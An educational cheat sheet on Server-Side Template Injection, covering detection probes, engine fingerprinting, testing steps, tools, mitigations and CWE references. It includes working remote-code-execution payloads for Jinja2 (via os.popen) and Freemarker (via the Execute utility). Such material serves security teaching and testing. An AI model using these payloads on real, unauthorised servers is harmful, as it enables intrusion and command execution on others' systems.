# What is Server-Side Template Injection?

Server-Side Template Injection (SSTI) happens when user input is embedded into a template that the server then evaluates. Because template engines can call into the host language, SSTI often escalates straight to remote code execution. The classic tell is that `{{7*7}}` comes back as `49`.

## How it works

- The app builds a template by concatenating user input instead of passing it as data
- The engine evaluates your input as template syntax, not text
- Depending on the engine you can read variables, call objects, or reach the OS

## Detection payloads

```text
# Polyglot probe - if any part evaluates, dig deeper
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
{{7*'7'}}

# Engine fingerprinting
{{7*7}}      -> Jinja2 / Twig
${7*7}       -> Freemarker / JSP EL
#{7*7}       -> Ruby ERB / Thymeleaf
```

## Exploitation examples

```python
# Jinja2 (Python) - read files then RCE
{{ config.items() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

```java
// Freemarker (Java) - command execution
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

## Tools

- [tplmap](https://github.com/epinna/tplmap) - automated SSTI detection and exploitation
- [Burp Suite](https://portswigger.net/burp) - Repeater for manual engine fingerprinting

## Manual testing

1. Inject `${{<%[%'"}}%\` and see if the app errors (unbalanced syntax)
2. Send math like `{{7*7}}` and confirm it evaluates to `49`
3. Fingerprint the engine using the syntax that works
4. Move from reading objects to invoking OS calls, in scope only

## Mitigation

- Do not let users control template content; pass their data as parameters
- Use a logic-less or sandboxed template engine for untrusted input
- Keep the template engine patched and disable dangerous built-ins
- Run the app with least privilege so RCE impact is contained

## Deep dive

- [SSTI - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger SSTI labs](https://portswigger.net/web-security/server-side-template-injection)

## CWE

- CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine
- CWE-94: Improper Control of Generation of Code
